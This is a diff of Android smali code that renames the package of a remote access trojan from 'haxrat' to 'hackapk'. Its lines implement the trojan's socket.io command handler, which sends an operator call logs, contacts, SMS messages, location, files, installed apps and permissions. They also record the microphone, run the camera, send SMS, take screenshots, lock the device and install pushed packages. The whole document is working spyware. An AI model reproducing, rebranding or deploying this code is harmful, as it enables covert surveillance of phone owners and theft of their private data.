@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/ConnectionManager;
+.class public Lcom/justhack/hackapk/ConnectionManager;
 .super Ljava/lang/Object;
 .source "ConnectionManager.java"
 
@@ -6,8 +6,8 @@
 # annotations
 .annotation system Ldalvik/annotation/MemberClasses;
     value = {
-        Lcom/hax4us/haxrat/ConnectionManager$100000000;,
-        Lcom/hax4us/haxrat/ConnectionManager$100000001;
+        Lcom/justhack/hackapk/ConnectionManager$100000000;,
+        Lcom/justhack/hackapk/ConnectionManager$100000001;
     }
 .end annotation
 
@@ -19,7 +19,7 @@
 
 .field public static context:Landroid/content/Context;
 
-.field private static fm:Lcom/hax4us/haxrat/FileManager;
+.field private static fm:Lcom/justhack/hackapk/FileManager;
 
 .field private static ioSocket:Lio/socket/client/Socket;
 
@@ -28,7 +28,7 @@
 .method static final constructor <clinit>()V
     .locals 5
 
-    new-instance v2, Lcom/hax4us/haxrat/FileManager;
+    new-instance v2, Lcom/justhack/hackapk/FileManager;
 
     move-object v4, v2
 
@@ -36,9 +36,9 @@
 
     move-object v3, v4
 
-    invoke-direct {v3}, Lcom/hax4us/haxrat/FileManager;-><init>()V
+    invoke-direct {v3}, Lcom/justhack/hackapk/FileManager;-><init>()V
 
-    sput-object v2, Lcom/hax4us/haxrat/ConnectionManager;->fm:Lcom/hax4us/haxrat/FileManager;
+    sput-object v2, Lcom/justhack/hackapk/ConnectionManager;->fm:Lcom/justhack/hackapk/FileManager;
 
     return-void
 .end method
@@ -67,7 +67,7 @@
 
     .prologue
     .line 165
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v3, "0xCL"
 
@@ -83,7 +83,7 @@
 
     const/4 v6, 0x0
 
-    invoke-static {}, Lcom/hax4us/haxrat/CallsManager;->getCallsLogs()Lorg/json/JSONObject;
+    invoke-static {}, Lcom/justhack/hackapk/CallsManager;->getCallsLogs()Lorg/json/JSONObject;
 
     move-result-object v7
 
@@ -106,7 +106,7 @@
 
     .prologue
     .line 169
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v3, "0xCO"
 
@@ -122,7 +122,7 @@
 
     const/4 v6, 0x0
 
-    invoke-static {}, Lcom/hax4us/haxrat/ContactsManager;->getContacts()Lorg/json/JSONObject;
+    invoke-static {}, Lcom/justhack/hackapk/ContactsManager;->getContacts()Lorg/json/JSONObject;
 
     move-result-object v7
 
@@ -169,10 +169,10 @@
 
     move-object v7, v13
 
-    sget-object v8, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v8, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     :try_start_0
-    const-string v9, "com.hax4us.haxrat.CamService"
+    const-string v9, "com.justhack.hackapk.CamService"
 
     invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -207,7 +207,7 @@
     move-result-object v6
 
     .line 253
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     move-object v7, v3
 
@@ -296,7 +296,7 @@
 
     move-object v8, v1
 
-    invoke-static {v8}, Lcom/hax4us/haxrat/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;
+    invoke-static {v8}, Lcom/justhack/hackapk/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;
 
     move-result-object v8
 
@@ -305,7 +305,7 @@
     move-result-object v6
 
     .line 148
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v7, "0xFI"
 
@@ -355,7 +355,7 @@
     .line 151
     move-object v6, v1
 
-    invoke-static {v6}, Lcom/hax4us/haxrat/FileManager;->downloadFile(Ljava/lang/String;)V
+    invoke-static {v6}, Lcom/justhack/hackapk/FileManager;->downloadFile(Ljava/lang/String;)V
 
     goto :goto_0
 .end method
@@ -405,7 +405,7 @@
 
     move-object v7, v0
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/PermissionManager;->canIUse(Ljava/lang/String;)Z
+    invoke-static {v7}, Lcom/justhack/hackapk/PermissionManager;->canIUse(Ljava/lang/String;)Z
 
     move-result v7
 
@@ -414,7 +414,7 @@
     move-result-object v5
 
     .line 195
-    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v5, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v6, "0xGP"
 
@@ -461,7 +461,7 @@
 
     .prologue
     .line 186
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v3, "0xIN"
 
@@ -479,7 +479,7 @@
 
     const/4 v7, 0x0
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;
+    invoke-static {v7}, Lcom/justhack/hackapk/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;
 
     move-result-object v7
 
@@ -502,7 +502,7 @@
 
     .prologue
     .line 211
-    sget-object v2, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
+    sget-object v2, Lcom/justhack/hackapk/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
 
     invoke-virtual {v2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V
 
@@ -529,7 +529,7 @@
     invoke-static {}, Landroid/os/Looper;->prepare()V
 
     .line 203
-    new-instance v3, Lcom/hax4us/haxrat/LocManager;
+    new-instance v3, Lcom/justhack/hackapk/LocManager;
 
     move-object v9, v3
 
@@ -537,23 +537,23 @@
 
     move-object v4, v9
 
-    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v5, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
-    invoke-direct {v4, v5}, Lcom/hax4us/haxrat/LocManager;-><init>(Landroid/content/Context;)V
+    invoke-direct {v4, v5}, Lcom/justhack/hackapk/LocManager;-><init>(Landroid/content/Context;)V
 
     move-object v1, v3
 
     .line 205
     move-object v3, v1
 
-    invoke-virtual {v3}, Lcom/hax4us/haxrat/LocManager;->canGetLocation()Z
+    invoke-virtual {v3}, Lcom/justhack/hackapk/LocManager;->canGetLocation()Z
 
     move-result v3
 
     if-eqz v3, :cond_0
 
     .line 206
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v4, "0xLO"
 
@@ -571,7 +571,7 @@
 
     move-object v8, v1
 
-    invoke-virtual {v8}, Lcom/hax4us/haxrat/LocManager;->getData()Lorg/json/JSONObject;
+    invoke-virtual {v8}, Lcom/justhack/hackapk/LocManager;->getData()Lorg/json/JSONObject;
 
     move-result-object v8
 
@@ -606,7 +606,7 @@
 
     move v3, v0
 
-    invoke-static {v3}, Lcom/hax4us/haxrat/MicManager;->startRecording(I)V
+    invoke-static {v3}, Lcom/justhack/hackapk/MicManager;->startRecording(I)V
 
     return-void
 .end method
@@ -621,7 +621,7 @@
 
     .prologue
     .line 181
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v3, "0xPM"
 
@@ -637,7 +637,7 @@
 
     const/4 v6, 0x0
 
-    invoke-static {}, Lcom/hax4us/haxrat/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;
+    invoke-static {}, Lcom/justhack/hackapk/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;
 
     move-result-object v7
 
@@ -684,10 +684,10 @@
 
     move-object v7, v13
 
-    sget-object v8, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v8, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     :try_start_0
-    const-string v9, "com.hax4us.haxrat.CamService"
+    const-string v9, "com.justhack.hackapk.CamService"
 
     invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -722,7 +722,7 @@
     move-result-object v6
 
     .line 245
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     move-object v7, v3
 
@@ -783,7 +783,7 @@
     if-ne v6, v7, :cond_1
 
     .line 157
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v7, "0xSM"
 
@@ -799,7 +799,7 @@
 
     const/4 v10, 0x0
 
-    invoke-static {}, Lcom/hax4us/haxrat/SMSManager;->getsms()Lorg/json/JSONObject;
+    invoke-static {}, Lcom/justhack/hackapk/SMSManager;->getsms()Lorg/json/JSONObject;
 
     move-result-object v11
 
@@ -827,14 +827,14 @@
 
     move-object v7, v2
 
-    invoke-static {v6, v7}, Lcom/hax4us/haxrat/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
+    invoke-static {v6, v7}, Lcom/justhack/hackapk/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
 
     move-result v6
 
     move v4, v6
 
     .line 160
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v7, "0xSM"
 
@@ -915,10 +915,10 @@
 
     move-object v6, v12
 
-    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v7, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     :try_start_0
-    const-string v8, "com.hax4us.haxrat.TransparentActivity"
+    const-string v8, "com.justhack.hackapk.TransparentActivity"
 
     invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -953,7 +953,7 @@
     move-result-object v5
 
     .line 237
-    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v5, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     move-object v6, v2
 
@@ -1004,10 +1004,10 @@
 
     move-object v5, v11
 
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     :try_start_0
-    const-string v7, "com.hax4us.haxrat.TransparentActivity"
+    const-string v7, "com.justhack.hackapk.TransparentActivity"
 
     invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -1031,14 +1031,14 @@
     move-result-object v4
 
     .line 228
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     move-object v5, v1
 
     invoke-virtual {v4, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
 
     .line 229
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v5, "0xSS"
 
@@ -1130,7 +1130,7 @@
     if-eqz v4, :cond_0
 
     .line 218
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v5, "0xUD"
 
@@ -1171,7 +1171,7 @@
     move-object v2, v4
 
     .line 220
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v5, "0xUD"
 
@@ -1196,16 +1196,16 @@
     move-result-object v4
 
     .line 221
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
-    const-string v5, "com.hax4us.haxrat"
+    const-string v5, "com.justhack.hackapk"
 
     move-object v6, v2
 
-    invoke-static {v4, v5, v6}, Lcom/hax4us/haxrat/AppUpdate;->installPackage(Landroid/content/Context;Ljava/lang/String;Ljava/io/InputStream;)V
+    invoke-static {v4, v5, v6}, Lcom/justhack/hackapk/AppUpdate;->installPackage(Landroid/content/Context;Ljava/lang/String;Ljava/io/InputStream;)V
 
     .line 222
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v5, "0xUD"
 
@@ -1242,7 +1242,7 @@
 
     .prologue
     .line 177
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v3, "0xWI"
 
@@ -1258,9 +1258,9 @@
 
     const/4 v6, 0x0
 
-    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v7, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
-    invoke-static {v7}, Lcom/hax4us/haxrat/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;
+    invoke-static {v7}, Lcom/justhack/hackapk/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;
 
     move-result-object v7
 
@@ -1276,7 +1276,7 @@
 .method static synthetic access$L1000000()Lio/socket/client/Socket;
     .locals 3
 
-    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v2, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     move-object v0, v2
 
@@ -1290,7 +1290,7 @@
 
     move-object v3, v0
 
-    sput-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sput-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     return-void
 .end method
@@ -1306,7 +1306,7 @@
     .prologue
     .line 37
     :try_start_0
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     if-eqz v3, :cond_0
 
@@ -1316,22 +1316,22 @@
 
     .line 39
     :cond_0
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v3
 
-    invoke-virtual {v3}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v3}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v3
 
-    sput-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sput-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     .line 40
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v4, "ping"
 
-    new-instance v5, Lcom/hax4us/haxrat/ConnectionManager$100000000;
+    new-instance v5, Lcom/justhack/hackapk/ConnectionManager$100000000;
 
     move-object v7, v5
 
@@ -1339,18 +1339,18 @@
 
     move-object v6, v7
 
-    invoke-direct {v6}, Lcom/hax4us/haxrat/ConnectionManager$100000000;-><init>()V
+    invoke-direct {v6}, Lcom/justhack/hackapk/ConnectionManager$100000000;-><init>()V
 
     invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;
 
     move-result-object v3
 
     .line 49
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     const-string v4, "order"
 
-    new-instance v5, Lcom/hax4us/haxrat/ConnectionManager$100000001;
+    new-instance v5, Lcom/justhack/hackapk/ConnectionManager$100000001;
 
     move-object v7, v5
 
@@ -1358,14 +1358,14 @@
 
     move-object v6, v7
 
-    invoke-direct {v6}, Lcom/hax4us/haxrat/ConnectionManager$100000001;-><init>()V
+    invoke-direct {v6}, Lcom/justhack/hackapk/ConnectionManager$100000001;-><init>()V
 
     invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;
 
     move-result-object v3
 
     .line 124
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->ioSocket:Lio/socket/client/Socket;
 
     invoke-virtual {v3}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
     :try_end_0
@@ -1416,10 +1416,10 @@
     move-object v4, v0
 
     :try_start_0
-    sput-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sput-object v4, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     .line 28
-    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->sendReq()V
+    invoke-static {}, Lcom/justhack/hackapk/ConnectionManager;->sendReq()V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -1436,7 +1436,7 @@
     .line 30
     move-object v4, v0
 
-    invoke-static {v4}, Lcom/hax4us/haxrat/ConnectionManager;->startAsync(Landroid/content/Context;)V
+    invoke-static {v4}, Lcom/justhack/hackapk/ConnectionManager;->startAsync(Landroid/content/Context;)V
 
     goto :goto_0
 .end method
